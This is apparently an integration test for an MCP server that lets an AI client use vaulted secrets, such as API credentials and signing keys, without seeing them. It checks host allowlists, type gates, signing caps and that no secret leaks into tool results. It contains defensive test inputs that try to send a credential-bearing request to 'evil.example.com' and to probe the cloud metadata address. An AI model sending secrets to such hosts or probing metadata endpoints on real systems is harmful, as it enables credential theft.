/*
 * Drives the server the way a real MCP client does, over stdio, against real Sepolia
 * The load bearing assertion is the last one, that no plaintext secret appears in any tool result
 */

import assert from "node:assert";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { Rewall } from "@rewall/sdk";
import { createPublicClient, http } from "viem";
import { sepolia } from "viem/chains";
import { identityFromSeed, fromBase64 } from "@rewall/sdk";

const UR = "0x4a1817d13e9cf196f471725176355c1234b63c70";
const NAME = process.env.REWALL_NAME;
const pass = (what) => console.log(`  ok  ${what}`);
const textOf = (result) => result.content.map((part) => part.text ?? "").join("\n");

const transport = new StdioClientTransport({
    command: "node",
    args: ["--env-file=.env", "--experimental-strip-types", "src/index.ts"],
    stderr: "pipe",
});
const client = new Client({ name: "rewall-check", version: "0.1.0" });
await client.connect(transport);

const seen = [];

try {
    /* The surface */

    const { tools } = await client.listTools();
    const names = tools.map((tool) => tool.name).sort();
    assert.deepStrictEqual(names, ["http_with_secret", "list_secrets", "otp_code", "sign_with_secret"]);
    pass(`server exposes ${names.join(", ")}`);

    /* Listing is metadata only */

    const listed = await client.callTool({ name: "list_secrets", arguments: {} });
    const listing = textOf(listed);
    seen.push(listing);
    assert.ok(listing.includes("openai"), "the live vault lists its secrets");
    assert.ok(/type=\w+/.test(listing), "each row carries a type");
    pass(`list_secrets returned ${listing.split("\n").length - 2} rows of metadata`);

    /* The allowlist refuses before anything is decrypted */

    const offList = await client.callTool({
        name: "http_with_secret",
        arguments: { secret: "openai", url: "https://evil.example.com/v1/models" },
    });
    seen.push(textOf(offList));
    assert.ok(offList.isError, "a host outside rewall.allow is refused");
    assert.ok(textOf(offList).includes("not in this secret's allowed hosts"));
    pass("a host outside rewall.allow is refused");

    const plain = await client.callTool({
        name: "http_with_secret",
        arguments: { secret: "openai", url: "http://api.openai.com/v1/models" },
    });
    seen.push(textOf(plain));
    assert.ok(plain.isError && textOf(plain).includes("only https"), "http is refused");
    pass("plain http is refused");

    const literal = await client.callTool({
        name: "http_with_secret",
        arguments: { secret: "openai", url: "https://169.254.169.254/latest/meta-data" },
    });
    seen.push(textOf(literal));
    assert.ok(literal.isError, "the cloud metadata address is refused");
    pass("an IP literal is refused");

    /* A real call to the one host the secret actually allows */

    const real = await client.callTool({
        name: "http_with_secret",
        arguments: { secret: "openai", url: "https://api.openai.com/v1/models" },
    });
    const body = textOf(real);
    seen.push(body);
    assert.ok(/from api\.openai\.com/.test(body), "the allowed host was reached");
    pass(`api.openai.com answered, ${body.split("\n")[0]}`);

    /* Type gates, so a credential cannot be used through the wrong tool */

    const wrongTool = await client.callTool({ name: "otp_code", arguments: { secret: "openai" } });
    seen.push(textOf(wrongTool));
    assert.ok(wrongTool.isError && /not an authenticator secret/.test(textOf(wrongTool)));
    pass("otp_code refuses a secret that is not a totp");

    // If a totp secret ever lands on chain the live path proves itself, and until then it says so
    const totpRow = listing.split("\n").find((line) => line.includes("type=totp"));
    if (totpRow) {
        const label = totpRow.trim().split(/\s+/)[0];
        const code = await client.callTool({ name: "otp_code", arguments: { secret: label } });
        seen.push(textOf(code));
        assert.ok(/^\d{6}, valid for another \d+s$/.test(textOf(code)), "otp_code returns a live code");
        pass(`otp_code returned a live code for ${label}`);
    } else {
        console.log("  --  otp_code live path unproven, no totp secret exists on chain yet");
    }

    /* Signing, which is bounded by policy rather than by the model's good behaviour */

    const TOKEN = "0x768f42455a2d082e23ceef7d51e5787c82d67a39";
    const ALLOWED = "0x1d494e7FdB3a6b4161400B7143EA97a68314C040";
    const sign = (args) => client.callTool({ name: "sign_with_secret", arguments: args });

    // The database secret is a connection string, so it must never reach a signing path
    const notAKey = await sign({ secret: "database", token: TOKEN, to: ALLOWED, amount: "1" });
    seen.push(textOf(notAKey));
    assert.ok(notAKey.isError && /not a signing key/.test(textOf(notAKey)));
    pass("sign_with_secret refuses the database secret, which is not a key");

    const noPolicy = await sign({ secret: "stripe-key", token: TOKEN, to: ALLOWED, amount: "1" });
    seen.push(textOf(noPolicy));
    assert.ok(noPolicy.isError, "a secret with no signing policy is refused");
    pass("a secret with no signing policy is refused");

    const stranger = await sign({
        secret: "treasury",
        token: TOKEN,
        to: "0x000000000000000000000000000000000000dEaD",
        amount: "1",
    });
    seen.push(textOf(stranger));
    assert.ok(stranger.isError && /not an allowed recipient/.test(textOf(stranger)));
    pass("a recipient outside the policy is refused");

    const tooMuch = await sign({ secret: "treasury", token: TOKEN, to: ALLOWED, amount: "999999999" });
    seen.push(textOf(tooMuch));
    assert.ok(tooMuch.isError && /over this secret's cap/.test(textOf(tooMuch)));
    pass("an amount over the cap is refused");

    const signed = await sign({ secret: "treasury", token: TOKEN, to: ALLOWED, amount: "250000" });
    const signedText = textOf(signed);
    seen.push(signedText);
    assert.ok(!signed.isError, `signing failed: ${signedText}`);
    const raw = signedText.match(/0x02[0-9a-f]{40,}/)?.[0];
    assert.ok(raw, "a raw signed transaction came back");
    // a9059cbb is transfer(address,uint256), so the tool built the calldata rather than taking it
    assert.ok(raw.includes("a9059cbb"), "the calldata is an erc20 transfer");
    assert.ok(raw.toLowerCase().includes(ALLOWED.slice(2).toLowerCase()), "the recipient is the one allowed");
    pass(`treasury signed a transfer, ${raw.length} char raw transaction`);

    /* The property the whole server exists for */

    const identity = await identityFromSeed(fromBase64(process.env.REWALL_IDENTITY_SEED));
    const rewall = new Rewall({
        publicClient: createPublicClient({ chain: sepolia, transport: http(undefined, { batch: true }) }),
        name: NAME,
        universalResolver: UR,
        identity,
    });
    // Both the credential that was sent over HTTP and the key that signed, since either leaking is fatal
    const values = await Promise.all(
        ["openai", "treasury"].map(async (label) =>
            new TextDecoder().decode(await rewall.get(`${label}.rewall.${NAME}`)).trim(),
        ),
    );
    values.forEach((value) => assert.ok(value.length >= 8, "the check is comparing against a real value"));

    for (const [index, result] of seen.entries()) {
        for (const value of values) {
            assert.ok(!result.includes(value), `tool result ${index} leaked a secret`);
        }
    }
    pass(`no plaintext of ${values.length} secrets in any of ${seen.length} tool results`);
} finally {
    await client.close();
}

console.log("\ncheck.mjs ok");
